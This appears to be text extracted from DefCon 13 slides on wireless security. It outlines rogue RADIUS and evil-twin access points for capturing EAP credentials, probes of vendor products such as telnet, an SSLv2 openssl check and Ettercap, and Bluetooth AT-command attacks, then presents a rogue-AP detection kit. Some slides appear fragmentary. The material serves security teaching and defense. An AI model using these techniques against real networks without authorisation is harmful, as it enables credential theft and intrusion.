Rogue RADIUS
● Who says rogue APs can't be used 
against corporate wireless 
networks?
● There are plenty of ways to screw 
up EAP.
● FreeRADIUS provides a simple & 
easy way to accept EAP 
credentials
– Integrates nicely with hostapd.
● Can allow for “EAP Peeking”...

Wireless Weaponry for 
Windows
● But rogue AP attacks require a 
“sophisticated hacker”, right?  
Wrong.
● SoftAP + TreeWalk + Apache + 
ActivePerl = Airsnarf for 
Windows

– “Evil Twin Access Points for Dummies”
● But why only run one rogue AP, 
when you can run two... or three?

Four Hard Questions?
● Does your product produce an 
external log?
● Do you have a security incident report 
mechanism?
● Does your product store it’s key 
material securely?
● Do you provide a secure management 
interface?
      Why are these hard questions in 2005?
DefCon 13
Don’t make things worse
● Security products should NOT 
increase the attack surface.
● Central servers are single points 
of failure
● Communicate securely among 
your components
● Don’t run sloppy distro’s
DefCon 13
Stupid Vendor Tricks
● No logging when there are errors
● No logging upon start-up
● Self-signed certificates ONLY
● No capability for change control
● Incoherent documentation/UI
● Follow the damn protocol specs
DefCon 13
Attacks you should try
● Run NMAP and NESSUS (or your fav 
commercial equivalent)
● telnet 10.0.0.1 22
● openssl s_client –connect 10.0.0.1:443 –ssl2
● Go after the web interface
● Ettercap
● Google for a random relevant exploit and try 
it (or one off a security mailing list)

How you can make things 
better
● Report flaws to the vendor

– Millions more radios than last year
– Several high profile vulnerabilities
– Near zero focus from enterprises
• Trifinite.org’s work
– Blooover quite the uber tool

● Several other attacks via AT 
commands
– Dialing, getting data, etc… not good 
things to do without authentication

tho…
– Gonna be a bad year for IT security

Defending Wireless 
Networks
● We seemed to have covered a lot of 
ground on the Offensive.. What about 
Defense *boom boom* Defense!
● First there was Host Spot Defense 
Kit (HSDK)
– Released BH Fed 03
– Looked for directed rogue AP attacks 
against your client
– OS X, Linux, and Windows code
DefCon 13
Defending Wireless 
Networks
● At the time of HSDK, there was NO 
capability for rogue detection in 
commercially avail software
● Today, we’re still not much better
– AirDefense Mobile, some other small stuff
– Rogues are THE BIGGEST threat against 
enterprise networks
• So, while the industry is still finding 
their whatnot with both hands, we’re 
making…
DefCon 13
Hot Spot Defense Kit v2
● Enterprise wireless IDS systems look 
for any attack, not just one directed 
at a particular client
● When you are on the road (or don’t 
have the “luxury” of an enterprise 
WIDS) you need the same kind of 
protection
DefCon 13
Hot Spot Defense Kit v2
● HSDK v 2 aims to be an 
environmental monitor of sorts
– Looks  for any zip in the wire, not just 
ones directly effecting the client
– If you’re in downtown Baltimore, and 
someone starts shooting, you tend to 
freak out even if they’re not shooting at 
you… wireless shouldn’t be any different
DefCon 13
HSDK v2
● Still under development
● Looking for:
– Mass auth/deauth/assoc attacks
– Fake AP signatures
– Reinjection attacks (hard)
– The standard rogue detection stuff from 
v1
• If something is detected, the green 
ball turns red (step away from the 
computer)
– If security software isn’t usable, it’s 
useless
DefCon 13
Speaking of…
● As security professionals, we sure 
haven’t learned much
– Security needs to be usable by the users
● Users need hueristic decisions made for them 
and presented in red or green balls
– Security admins need to act like 
professionals and have a real 
understanding of their operations
